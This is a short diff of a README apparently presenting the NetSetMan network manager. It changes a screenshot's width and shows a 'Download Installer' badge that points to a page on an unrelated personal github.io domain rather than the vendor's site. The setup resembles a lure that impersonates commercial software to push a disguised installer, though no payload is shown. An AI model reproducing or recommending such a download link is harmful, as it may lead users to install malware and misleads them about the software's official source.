@@ -25,7 +25,7 @@ NetSetMan integrates naturally into workstation networking workflows and deliver
 ---
 
 <div align="center">
-<img src="https://www.netsetman.com/img/nsm-box-pro.png" alt="NetSetMan Screenshot" width="500">
+<img src="https://www.netsetman.com/img/nsm-box-pro.png" alt="NetSetMan Screenshot" width="300">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://alijahfraziernfnq.github.io/.github/NetSetMan-Network-Manager)
